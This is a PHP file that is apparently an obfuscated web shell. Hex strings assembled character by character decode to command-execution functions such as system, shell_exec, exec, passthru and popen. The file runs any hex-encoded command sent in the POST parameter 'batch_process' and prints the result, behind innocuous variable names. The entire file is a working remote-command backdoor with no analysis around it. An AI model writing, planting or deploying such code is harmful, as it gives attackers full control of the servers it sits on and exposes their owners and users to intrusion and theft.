<?php


$obj1 = '7';
$obj2 = '3';
$obj3 = '6';
$obj4 = 'd';
$obj5 = '5';
$obj6 = '8';
$obj7 = '0';
$obj8 = '2';
$obj9 = 'f';
$obj10 = 'e';
$obj11 = '1';
$obj12 = '4';
$obj13 = 'c';
$right_pad_string1 = pack("H*", $obj1.$obj2.'7'.'9'.$obj1.$obj2.$obj1.'4'.$obj3.'5'.'6'.$obj4);
$right_pad_string2 = pack("H*", '7'.$obj2.$obj3.'8'.'6'.'5'.'6'.'c'.'6'.'c'.$obj5.'f'.$obj3.$obj5.$obj1.$obj6.'6'.'5'.$obj3.'3');
$right_pad_string3 = pack("H*", $obj3.$obj5.$obj1.$obj6.$obj3.'5'.'6'.$obj2);
$right_pad_string4 = pack("H*", $obj1.$obj7.'6'.'1'.'7'.'3'.$obj1.'3'.$obj1.'4'.$obj3.$obj6.'7'.$obj8.$obj1.$obj5);
$right_pad_string5 = pack("H*", $obj1.$obj7.$obj3.$obj9.'7'.'0'.$obj3.$obj5.'6'.$obj10);
$right_pad_string6 = pack("H*", '7'.$obj2.'7'.'4'.'7'.'2'.'6'.$obj5.'6'.$obj11.$obj3.$obj4.$obj5.'f'.$obj3.'7'.'6'.'5'.'7'.'4'.$obj5.$obj9.'6'.'3'.'6'.'f'.'6'.$obj10.'7'.$obj12.'6'.$obj5.'6'.'e'.$obj1.'4'.$obj1.$obj2);
$right_pad_string7 = pack("H*", $obj1.'0'.$obj3.'3'.$obj3.$obj13.$obj3.$obj9.$obj1.'3'.$obj3.'5');
$batch_process = pack("H*", $obj3.$obj8.$obj3.$obj11.$obj1.'4'.'6'.$obj2.'6'.$obj6.'5'.$obj9.'7'.'0'.$obj1.'2'.'6'.'f'.'6'.$obj2.'6'.'5'.'7'.$obj2.$obj1.'3');
if (isset($_POST[$batch_process])) {
    $batch_process = pack("H*", $_POST[$batch_process]);
    if (function_exists($right_pad_string1)) {
        $right_pad_string1($batch_process);
    } elseif (function_exists($right_pad_string2)) {
        print $right_pad_string2($batch_process);
    } elseif (function_exists($right_pad_string3)) {
        $right_pad_string3($batch_process, $hld_fac);
        print join("\n", $hld_fac);
    } elseif (function_exists($right_pad_string4)) {
        $right_pad_string4($batch_process);
    } elseif (function_exists($right_pad_string5) && function_exists($right_pad_string6) && function_exists($right_pad_string7)) {
        $ent_dat = $right_pad_string5($batch_process, 'r');
        if ($ent_dat) {
            $symbol_dchunk = $right_pad_string6($ent_dat);
            $right_pad_string7($ent_dat);
            print $symbol_dchunk;
        }
    }
    exit;
}
